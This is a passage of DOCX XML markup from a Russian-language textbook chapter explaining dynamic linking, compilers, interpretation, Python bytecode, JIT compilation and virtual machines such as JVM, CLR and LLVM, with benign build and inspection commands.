        <w:t>Размер файла может вырасти с 20 КБ до 2 МБ, потому что вся libc встроена.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading4"/>
      </w:pPr>
      <w:r>
        <w:t>**2. Динамическая линковка**</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">Программа использует </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>внешние библиотеки</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> (.dll на Windows, .so на Linux, .dylib на macOS). Библиотека загружается в память при запуске программы.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Плюсы:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Меньший размер программы.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Обновление библиотеки не требует перекомпиляции.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Несколько программ могут использовать одну копию библиотеки в памяти.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Минусы:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Зависимость от внешних библиотек (если библиотека удалена, программа не запустится).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>"DLL Hell" — конфликт версий библиотек.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Пример:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>gcc program.c -o program   # динамическая линковка (по умолчанию)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Проверить зависимости:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>ldd program   # Linux</w:t>
        <w:br/>
        <w:t>otool -L program   # macOS</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Примеры компиляторов</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>| Компилятор | Языки | Особенности |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>|-----------|-------|------------|</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">| </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>GCC</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> | C, C++, Fortran, Ada | Самый популярный, кроссплатформенный, open source |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">| </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Clang</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> | C, C++, Objective-C | Часть LLVM, быстрая компиляция, лучшие сообщения об ошибках |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">| </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>MSVC</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> | C, C++ | Компилятор Microsoft для Windows, интегрирован в Visual Studio |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">| </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Rust compiler</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> | Rust | Компилирует в LLVM IR, строгая проверка типов и безопасности памяти |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">| </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Go compiler</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> | Go | Очень быстрая компиляция (секунды для больших проектов) |</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Пример компиляции на GCC:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>gcc -O2 -Wall -Wextra program.c -o program</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Где:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>`-O2` — оптимизация уровня 2.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>`-Wall -Wextra` — включить все предупреждения (warnings).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>`-o program` — имя выходного файла.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>6.2.2. Интерпретация: выполнение на лету</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Интерпретатор</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — это программа, которая </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>читает и выполняет код построчно</w:t>
      </w:r>
      <w:r>
        <w:t>, без предварительной компиляции в машинный код.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Как работает:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Интерпретатор читает строку кода.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Парсит её (строит AST).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Выполняет.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Переходит к следующей строке.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Примеры интерпретируемых языков:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Python (CPython), Ruby, PHP, JavaScript (в старых браузерах).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Плюсы интерпретации</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Переносимость:** Один и тот же код работает на любой платформе, где есть интерпретатор.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Быстрая разработка:** Не нужно компилировать, изменения применяются сразу.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**REPL (Read-Eval-Print Loop):** Можно выполнять код интерактивно (консоль Python, Node.js).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Минусы интерпретации</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Медленнее:** Интерпретатор читает и парсит код каждый раз при запуске.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Нет оптимизаций компилятора:** Код выполняется "как есть".</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Требует интерпретатора:** Нельзя просто скопировать .exe и запустить на другом компьютере.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Байт-код интерпретаторы</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">Многие интерпретируемые языки (Python, Ruby, Java) сначала компилируют код в </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>байт-код</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — промежуточное представление, которое легче выполнять, чем исходный текст.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Пример (Python):</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>python program.py</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Что происходит:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Python компилирует `program.py` в байт-код (`__pycache__/program.cpython-311.pyc`).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Байт-код выполняется виртуальной машиной Python (PVM).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Байт-код</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — это не машинный код! Это низкоуровневые инструкции для виртуальной машины.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Пример байт-кода Python:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>def add(a, b):</w:t>
        <w:br/>
        <w:t xml:space="preserve">    return a + b</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Дизассемблируем:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>python -m dis program.py</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Вывод (примерно):</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t xml:space="preserve">  2           0 LOAD_FAST                0 (a)</w:t>
        <w:br/>
        <w:t xml:space="preserve">              2 LOAD_FAST                1 (b)</w:t>
        <w:br/>
        <w:t xml:space="preserve">              4 BINARY_ADD</w:t>
        <w:br/>
        <w:t xml:space="preserve">              6 RETURN_VALUE</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Инструкции виртуальной машины Python.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>6.2.3. JIT-компиляция: лучшее из двух миров</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>JIT (Just-In-Time) компиляция</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — это гибрид компиляции и интерпретации. Код сначала выполняется интерпретатором, а </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>горячие участки</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> (часто выполняемые) компилируются в машинный код прямо во время выполнения программы.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Как работает JIT:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Программа запускается интерпретатором (или выполняется байт-код).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>JIT-компилятор **профилирует** код (смотрит, какие функции вызываются чаще всего).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Горячие функции компилируются в машинный код.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>При следующем вызове выполняется машинный код (быстро!).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Примеры JIT-компиляторов:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**JVM (Java Virtual Machine):** HotSpot JIT компилирует байт-код Java в машинный код.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**V8 (JavaScript):** JIT-компилятор Chrome/Node.js.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**PyPy:** Альтернативная реализация Python с JIT (быстрее CPython в 5-10 раз).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**LuaJIT:** JIT для Lua (используется в игровых движках).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Многоуровневая компиляция (Tiered Compilation)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">Современные JIT-компиляторы используют </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>несколько уровней компиляции</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Interpreter:** Быстрый старт, медленное выполнение.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**C1 (Client Compiler):** Быстрая компиляция с базовыми оптимизациями.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**C2 (Server Compiler):** Медленная компиляция с агрессивными оптимизациями.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Пример (Java HotSpot):</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Программа запускается, код выполняется интерпретатором.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Через несколько вызовов функция компилируется C1 (быстрая компиляция).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Если функция вызывается очень часто, она перекомпилируется C2 (максимальная оптимизация).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Результат:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Программа на Java может работать </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>быстрее</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> скомпилированного C++ кода (если JIT-компилятор провёл хорошую оптимизацию на основе реальных данных выполнения).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>JIT vs AOT (Ahead-Of-Time) компиляция</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>| Критерий | JIT | AOT |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>|----------|-----|-----|</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>| Компиляция | Во время выполнения | До запуска |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>| Время старта | Медленнее (нужно прогреться) | Быстрее |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>| Скорость выполнения | Может быть быстрее (оптимизация на основе данных) | Стабильная |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>| Размер файла | Меньше (байт-код) | Больше (машинный код) |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>| Переносимость | Высокая (байт-код универсален) | Низкая (машинный код под конкретную архитектуру) |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>| Примеры | Java (HotSpot), JavaScript (V8), C# (CLR) | C, C++, Rust, Go |</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Гибридные подходы:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Java GraalVM:** JIT + AOT компиляция.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**.NET Native:** AOT компиляция C# приложений.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>6.2.4. Виртуальные машины</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Виртуальная машина (VM)</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — это программный эмулятор компьютера, который выполняет байт-код. VM абстрагирует программу от реальной архитектуры процессора.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>JVM (Java Virtual Machine)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Слоган Java:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> "Write Once, Run Anywhere" (Напиши один раз, запускай где угодно).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Как работает:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Ты пишешь код на Java.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Компилятор `javac` превращает код в байт-код (.class файлы).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>JVM выполняет байт-код на любой платформе (Windows, Linux, macOS, Android).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Пример:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>javac Program.java     # компиляция в байт-код</w:t>
        <w:br/>
        <w:t>java Program           # выполнение на JVM</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Особенности JVM:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Сборка мусора (Garbage Collection):** Автоматическое управление памятью.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**JIT-компиляция:** HotSpot оптимизирует горячий код.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Безопасность:** Изоляция кода (важно для апплетов и Android).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Языки для JVM:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Java, Kotlin, Scala, Groovy, Clojure.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>CLR (.NET Common Language Runtime)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Аналог JVM для .NET платформы (Microsoft).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Как работает:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Код на C# компилируется в **CIL (Common Intermediate Language)** — байт-код .NET.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>CLR выполняет CIL с помощью JIT-компилятора.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Языки для CLR:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> C#, F#, VB.NET.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>LLVM (Low Level Virtual Machine)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>LLVM</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — это не совсем VM, а </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>инфраструктура компиляторов</w:t>
      </w:r>
      <w:r>
        <w:t>. Многие компиляторы используют LLVM для генерации и оптимизации машинного кода.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Как работает:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Компилятор (Clang, Rust, Swift) переводит код в **LLVM IR (Intermediate Representation)** — промежуточное представление.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>LLVM оптимизирует IR.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>LLVM генерирует машинный код для целевой архитектуры (x86, ARM, RISC-V, WebAssembly).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Преимущества:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Один backend (LLVM) для всех языков.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Агрессивные оптимизации.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Поддержка множества архитектур.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Примеры компиляторов на LLVM:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Clang** (C/C++).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Rust compiler**.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Swift compiler**.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
